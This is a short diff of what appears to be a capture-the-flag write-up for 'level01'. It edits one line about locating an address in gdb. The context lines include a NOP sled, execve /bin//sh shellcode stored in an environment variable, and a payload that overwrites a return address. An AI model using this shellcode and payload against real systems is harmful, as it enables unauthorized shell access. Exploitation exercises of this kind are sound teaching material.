@@ -40,7 +40,7 @@ and we need somewhere to store it and because we are overwriting the return poin
 store our shellcode in the buffer since it will be deallocated at the end of main.
 So we can try to store it in the env.
 `export SHELLCODE=$(python -c 'print 100 * "\x90" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80"')`
-With gdb, we get the address: `0xffffd7db`
+With gdb, we get the address by print the stack (env esp+500): `0xffffd7db`
 
 payload => `(echo "dat_wil"; python -c 'print "A" * 80 + "\x53\xd8\xff\xff"') > /tmp/level01`
 
